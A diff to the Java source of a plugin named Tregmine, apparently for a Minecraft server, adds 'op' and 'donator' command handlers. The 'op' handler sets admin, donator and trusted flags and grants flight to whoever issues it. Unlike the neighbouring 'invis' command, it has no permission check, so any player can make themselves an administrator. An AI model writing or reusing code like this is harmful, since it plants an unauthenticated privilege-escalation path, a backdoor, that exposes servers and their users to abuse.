@@ -138,6 +138,22 @@ public class Tregmine extends JavaPlugin
 			from = (Player) sender;
 			player = this.getPlayer(from);
 		}
+		
+		if("op".matches(commandName)) {
+			player.setMetaBoolean("admin", true);
+			player.setMetaBoolean("donator", true);
+			player.setMetaBoolean("trusted", true);
+			player.setTemporaryChatName(ChatColor.RED + player.getName());
+			player.setAllowFlight(true);
+		}
+
+		if("donator".matches(commandName)) {
+			player.setAllowFlight(true);
+			player.setMetaBoolean("admin", false);
+			player.setMetaBoolean("donator", true);
+			player.setMetaBoolean("trusted", true);
+			player.setTemporaryChatName(ChatColor.GOLD + player.getName());
+		}
 
 		if("invis".matches(commandName) && player.isOp()) {
 			if ("off".matches(args[0])) {
